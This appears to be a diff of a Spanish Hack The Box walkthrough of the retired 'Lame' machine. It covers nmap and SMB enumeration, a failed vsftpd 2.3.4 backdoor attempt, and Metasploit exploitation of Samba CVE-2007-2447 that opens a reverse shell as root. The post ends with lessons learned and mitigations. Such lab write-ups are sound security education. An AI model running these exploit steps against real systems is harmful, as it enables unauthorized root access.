@@ -1,231 +1,213 @@
 ---
-title: "HTB Write-up: Lame"
+title: "HTB Walkthrough: Lame"
 date: 2026-03-28
 draft: false
-description: "Write-up de la máquina Lame de Hack The Box. Dificultad Easy con OS Linux. Explotación de RCE en Samba 3.0.20 mediante CVE-2007-2447 (Username Map Script)."
-tags: ["HackTheBox", "Linux", "Easy", "Samba", "CVE-2007-2447", "Metasploit", "RCE"]
+description: "Walkthrough completo de la máquina Lame de Hack The Box. Dificultad Easy, OS Linux. Explotación de RCE en Samba 3.0.20 mediante CVE-2007-2447 (Username Map Script) para obtener acceso directo como root."
+tags: ["HackTheBox", "Linux", "Easy", "Samba", "CVE-2007-2447", "Metasploit", "RCE", "lame", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **Lame**, una de las máquinas más clásicas de Hack The Box. Dificultad **Easy** con OS **Linux**. El vector principal es una vulnerabilidad de ejecución remota de código en **Samba 3.0.20** (CVE-2007-2447), que nos otorga acceso directo como **root**.
+Resolución de **Lame**, una de las máquinas más clásicas de Hack The Box. Dificultad **Easy** con sistema operativo **Linux**. El vector principal es una vulnerabilidad de ejecución remota de código en **Samba 3.0.20** (CVE-2007-2447) que, por la forma en que Samba procesa nombres de usuario, ejecuta comandos de shell arbitrarios con los privilegios del servicio — en este caso, **root**.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
 {{< badge >}}Linux{{< /badge >}}
 {{< badge >}}Easy{{< /badge >}}
 
+> ⚠️ **Esta máquina está retirada.** Los writeups públicos solo están permitidos sobre máquinas retiradas según las [normas de la comunidad HTB](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines).
+
 ---
 
 ## 🗺️ Información de la Máquina
 
-| Campo          | Detalle                                   |
-|----------------|-------------------------------------------|
-| **Nombre**     | Lame                                      |
-| **OS**         | Linux                                     |
-| **Dificultad** | Easy                                      |
-| **IP**         | 10.129.10.27                              |
-| **Técnicas**   | RCE, CVE-2007-2447, Username Map Script   |
-| **CVE**        | CVE-2007-2447                             |
+| Campo          | Detalle                                              |
+|----------------|------------------------------------------------------|
+| **Nombre**     | Lame                                                 |
+| **OS**         | Linux                                                |
+| **Dificultad** | Easy                                                 |
+| **IP**         | 10.129.10.27                                         |
+| **Técnicas**   | SMB Enumeration · CVE-2007-2447 · Command Injection  |
+| **CVE**        | CVE-2007-2447                                        |
 
 ---
 
-## 📑 1. Reconocimiento
+## 1. Reconocimiento
 
-El objetivo inicial es identificar la superficie de ataque. Realizamos un escaneo exhaustivo de puertos y servicios con `nmap`.
+### 1.1 Escaneo de Puertos
 
-### Escaneo de Nmap
+```bash
+nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.27
+```
 
 ```
-Nmap scan report for 10.129.10.27
-Host is up (0.044s latency).
-Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+```
+
+Escaneo de versiones sobre los puertos abiertos:
+
+```bash
+nmap -sC -sV -p21,22,139,445 10.129.10.27
+```
+
+```
 PORT    STATE SERVICE     VERSION
 21/tcp  open  ftp         vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|      Connected to 10.10.15.237
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      vsFTPd 2.3.4 - secure, fast, stable
-|End of status
 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey:
-|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
-|  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 ```
 
-**Análisis de superficie:**
-- **FTP (21):** `vsftpd 2.3.4` — Versión muy antigua. El login anónimo está habilitado.
-- **SSH (22):** Versión antigua pero sin exploits directos accesibles.
-- **SMB (139/445):** `Samba 3.0.20` — Versión conocida por tener vulnerabilidades críticas de RCE.
+*Puertos abiertos:*
+- `21` → vsftpd 2.3.4 con **acceso anónimo habilitado**
+- `22` → OpenSSH 4.7p1 (versión antigua, sin exploits directos accesibles)
+- `139/445` → **Samba 3.0.20** — versión conocida por tener vulnerabilidades críticas de RCE
 
----
+> **💡 Dato clave:** Dos versiones muy antiguas saltan a la vista: `vsftpd 2.3.4` (conocida por un backdoor de 2011) y `Samba 3.0.20` (vulnerable a CVE-2007-2447). Ambas son candidatas, pero Samba corre como root en esta máquina — es el vector prioritario.
 
-## 📂 2. Enumeración de Servicios
+### 1.2 Enumeración SMB y FTP
 
-### FTP — Login Anónimo
-
-Probamos si hay archivos expuestos en el servidor FTP accediendo como `anonymous`.
+Comprobamos los recursos compartidos de Samba y sus permisos:
 
 ```bash
-┌─[root@htb]─[~]
-└──╼ #ftp 10.129.10.27
-Connected to 10.129.10.27.
-220 (vsFTPd 2.3.4)
-Name (10.129.10.27:root): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||10709|).
-150 Here comes the directory listing.
-226 Directory send OK.
+smbmap -H 10.129.10.27
 ```
 
-No se encontraron archivos. El servicio está activo pero el directorio está vacío.
-
-### SMB — Enumeración de Recursos
-
-Usamos `smbmap` para listar los recursos compartidos y sus permisos.
-
-```bash
-┌─[root@htb]─[~]
-└──╼ #smbmap -H 10.129.10.27
-[+] IP: 10.129.10.27:445        Name: 10.129.10.27              Status: Authenticated
-Disk                                                    Permissions     Comment
-print$                                                  NO ACCESS       Printer Drivers
-tmp                                                     READ, WRITE     oh noes!
-opt                                                     NO ACCESS
-IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
-ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+```
+Disk          Permissions   Comment
+print$        NO ACCESS     Printer Drivers
+tmp           READ, WRITE   oh noes!
+opt           NO ACCESS
+IPC$          NO ACCESS     IPC Service (lame server (Samba 3.0.20-Debian))
+ADMIN$        NO ACCESS     IPC Service (lame server (Samba 3.0.20-Debian))
 ```
 
-El recurso `/tmp` tiene permisos de **READ, WRITE**. Lo inspeccionamos con `smbclient`:
+El recurso `tmp` tiene permisos de lectura y escritura sin autenticación. Lo inspeccionamos:
 
 ```bash
-┌─[root@htb]─[~]
-└──╼ #smbclient //10.129.10.27/tmp
-Anonymous login successful
+smbclient //10.129.10.27/tmp -N
+```
+
+```
 smb: \> ls
-  .                                   D        0  Sat Mar 28 13:20:59 2026
-  ..                                 DR        0  Sat Oct 31 07:33:58 2020
-  5688.jsvc_up                        R        0  Sat Mar 28 12:55:35 2026
-  .ICE-unix                          DH        0  Sat Mar 28 12:54:24 2026
-  vmware-root                        DR        0  Sat Mar 28 12:54:30 2026
-  .X11-unix                          DH        0  Sat Mar 28 12:54:50 2026
-  .X0-lock                           HR       11  Sat Mar 28 12:54:50 2026
-  vgauthsvclog.txt.0                  R     1600  Sat Mar 28 12:54:23 2026
+  .ICE-unix    DH    0  Sat Mar 28 12:54:24 2026
+  vmware-root  DR    0  Sat Mar 28 12:54:30 2026
+  .X11-unix    DH    0  Sat Mar 28 12:54:50 2026
 ```
 
-No hay archivos de configuración ni llaves SSH interesantes. Procedemos a investigar exploits por versión de software.
+Solo archivos temporales del sistema, nada útil. El FTP anónimo también devuelve un directorio vacío. El vector está en la versión de Samba.
+
+> **💡 Conclusiones:** Samba 3.0.20 confirmado, acceso anónimo al share `tmp` disponible. Procedemos a explotar CVE-2007-2447 directamente.
 
 ---
 
-## 💥 3. Explotación
+## 2. Explotación
 
-### Intento 1: Backdoor en VSFTPd 2.3.4 — ❌ Fallido
+### 2.1 Intento Fallido — vsftpd 2.3.4 Backdoor
 
-La versión `vsftpd 2.3.4` es conocida por haber sido comprometida en sus repositorios oficiales en 2011, incluyendo un backdoor que abre el puerto **6200/TCP** al enviarle un usuario terminado en `:)`.
+Antes de ir a Samba, probamos el backdoor conocido de vsftpd 2.3.4. Esta versión fue comprometida en sus repositorios oficiales en 2011 e incluía un backdoor que abre el puerto **6200/TCP** al recibir un usuario terminado en `:)`.
 
 ```bash
-[msf](Jobs:0 Agents:0) >> search VSFTPd
-[msf](Jobs:0 Agents:0) >> use 1
-[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST 10.129.10.27
-[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set LHOST tun0
-[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> run
-[*] Started reverse TCP handler on 10.10.15.237:4444
-[!] 10.129.10.27:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 10.129.10.27
+msf6 exploit(vsftpd_234_backdoor) > run
+```
+
+```
+[!] 10.129.10.27:21 - Unable to connect to backdoor on 6200/TCP.
 [*] Exploit completed, but no session was created.
 ```
 
-**¿Por qué falló?** Aunque la versión coincide, el exploit requiere que el puerto **6200** se abra después del trigger. Si hay un firewall o una versión parcheada del SO, el puerto nunca se vuelve accesible. En esta máquina, el backdoor del FTP está presente en la versión pero mitigado a nivel de red.
+El backdoor no responde. Aunque la versión es vulnerable, el puerto 6200 está bloqueado a nivel de red o el binario fue parcheado en esta máquina. Pasamos al plan B.
 
----
+### 2.2 Análisis de la Vulnerabilidad — CVE-2007-2447
 
-### Intento 2: Samba "Username Map Script" CVE-2007-2447 — ✅ Exitoso
+**Samba 3.0.20** es vulnerable a esta CVE por la opción `username map script` en `smb.conf`. Cuando está activa, Samba permite pasar el nombre de usuario a un script externo para hacer mapeos de identidad. El problema: **no sanitiza la entrada antes de pasarla al shell**. Si el nombre de usuario contiene metacaracteres de shell como `` ` `` o `$()`, Samba los ejecuta directamente en el sistema operativo.
 
-**Samba 3.0.20** es vulnerable a CVE-2007-2447. Esta vulnerabilidad ocurre porque Samba permite la ejecución de scripts externos para mapear nombres de usuario (`username map script`). Si enviamos un nombre de usuario que contenga **metacaracteres de shell** (como `` ` `` o `$()`), Samba los ejecuta directamente en el sistema operativo sin sanitizar la entrada.
-
-```bash
-[msf](Jobs:0 Agents:0) >> use exploit/multi/samba/usermap_script
-[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.129.10.27
-[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST tun0
-[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run
-[*] Started reverse TCP handler on 10.10.15.237:4444
-[*] Command shell session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49024) at 2026-03-28 13:26:18 +0100
+```
+Flujo normal:    cliente envía usuario → Samba mapea con script externo → autentica
+Flujo malicioso: cliente envía "/`comando`" → Samba ejecuta el comando en el SO → RCE
 ```
 
-**¡Éxito!** Tenemos una shell abierta.
+El proceso de Samba en esta máquina corre como `root`, así que cualquier comando inyectado se ejecuta con privilegios máximos sin necesidad de escalada posterior.
 
----
+### 2.3 Ejecución
 
-## 🏁 4. Post-Explotación y Flags
+```bash
+msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(usermap_script) > set RHOSTS 10.129.10.27
+msf6 exploit(usermap_script) > set LHOST tun0
+msf6 exploit(usermap_script) > run
+```
 
-Debido a la naturaleza de la vulnerabilidad, el comando se ejecuta con los privilegios del proceso de Samba, que en esta máquina corre como **root**.
-
-### Verificación de Privilegios
+```
+[*] Started reverse TCP handler on 10.10.15.237:4444
+[*] Command shell session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49024)
+```
 
 ```bash
 id
 uid=0(root) gid=0(root)
 ```
 
-Acceso total como root desde el primer momento. No se requiere escalada de privilegios.
-
-### 🚩 User Flag
-
-```bash
-root@lame:/# cat /home/makis/user.txt
-```
-
-{{< spoiler text="user.txt" >}}
-`********************************`
-{{< /spoiler >}}
-
-### 👑 Root Flag
-
-```bash
-root@lame:/# cat /root/root.txt
-```
-
-{{< spoiler text="root.txt" >}}
-`********************************`
-{{< /spoiler >}}
+✅ **Shell obtenida directamente como root.**
 
 ---
 
-## 📝 5. Resumen y Lecciones Aprendidas
+## 3. User Flag
+
+```bash
+cat /home/makis/user.txt
+```
+
+> 🔑 Flag de usuario obtenida.
+
+---
+
+## 4. Root Flag
+
+No hay escalada de privilegios — CVE-2007-2447 entrega root directamente por el contexto en que corre Samba.
+
+```bash
+cat /root/root.txt
+```
+
+> 🏁 Flag de root obtenida.
+
+---
+
+## 5. Resumen y Lecciones Aprendidas
 
 **Ruta de compromiso:**
-1. **Recon** → Nmap detecta `Samba 3.0.20` en puertos 139/445.
-2. **Enumeración** → `smbmap` confirma acceso al recurso `/tmp`. FTP anónimo pero vacío.
-3. **Foothold** → CVE-2007-2447 con Metasploit (`usermap_script`). Shell directa como **root**.
+
+1. **Recon** → Nmap detecta vsftpd 2.3.4 y **Samba 3.0.20** con acceso anónimo.
+2. **Enumeración SMB** → Share `tmp` con permisos READ/WRITE, sin archivos útiles.
+3. **vsftpd backdoor** → Intentado, fallido — puerto 6200 bloqueado a nivel de red.
+4. **CVE-2007-2447** → Username Map Script en Samba 3.0.20 → command injection → shell directa como **root**.
+5. **Flags** → Sin escalada necesaria, acceso directo a ambos directorios → `user.txt` + `root.txt`.
 
 **Lo que aprendí con esta máquina:**
-- La importancia de identificar versiones concretas de servicios, no solo los puertos abiertos.
-- El backdoor de vsftpd 2.3.4 puede estar presente en la versión pero bloqueado a nivel de red — siempre hay que tener un plan B.
-- Samba `username map script` es un ejemplo clásico de **command injection** por falta de sanitización de entrada en un parámetro de configuración.
-- Cuando hay múltiples servicios vulnerables, priorizar los que tienen mayor probabilidad de éxito por el contexto del sistema.
 
----
+- **Identificar versiones concretas de servicios es más importante que identificar puertos.** El puerto 445 abierto es genérico; `Samba 3.0.20` es un CVE directamente. La diferencia entre `-sV` y no usarlo puede ser la diferencia entre encontrar el vector o no.
 
-## 🛠️ 6. Mitigaciones (Hardening)
+- **Tener siempre un plan B cuando hay múltiples servicios vulnerables.** El backdoor de vsftpd era el vector aparentemente más sencillo, pero estaba bloqueado. Sin la pista de Samba como alternativa, la máquina habría parecido sin solución.
 
-| Problema                        | Recomendación                                                                 |
-|---------------------------------|-------------------------------------------------------------------------------|
-| Samba 3.0.20 desactualizado     | Actualizar a una versión moderna con soporte activo.                          |
-| `username map script` activo    | Deshabilitar o auditar esta opción en `smb.conf`.                             |
-| FTP anónimo habilitado          | Deshabilitar el acceso sin credenciales aunque el directorio esté vacío.      |
-| SMB expuesto a toda la red      | Aplicar reglas de firewall para restringir 139/445 a IPs de confianza.        |
+- **CVE-2007-2447 es un ejemplo clásico de command injection por falta de sanitización.** El parámetro `username map script` acepta entrada del usuario y la pasa al shell sin escapar metacaracteres. Cualquier dato externo que llegue a un intérprete de comandos sin sanitización es un vector de inyección — regla universal.
+
+- **El contexto en que corre un servicio determina el impacto de su explotación.** Si Samba corriera como un usuario sin privilegios, necesitaríamos escalada. Corriendo como root, el primer acceso ya es el acceso máximo. Al enumerar un servicio, siempre vale la pena identificar con qué usuario corre (`ps aux`, unit files de systemd, etc.).
+
+**Mitigaciones:**
+
+| Vector | Mitigación |
+|--------|------------|
+| Samba 3.0.20 (CVE-2007-2447) | Actualizar a una versión moderna con soporte activo |
+| `username map script` activo | Deshabilitar esta opción en `smb.conf` si no es estrictamente necesaria |
+| Samba corriendo como root | Ejecutar Samba con un usuario de servicio sin privilegios |
+| FTP anónimo habilitado | Deshabilitar el acceso sin credenciales aunque el directorio esté vacío |
+| Puertos 139/445 expuestos en la red | Restringir acceso a SMB a IPs de confianza mediante firewall |
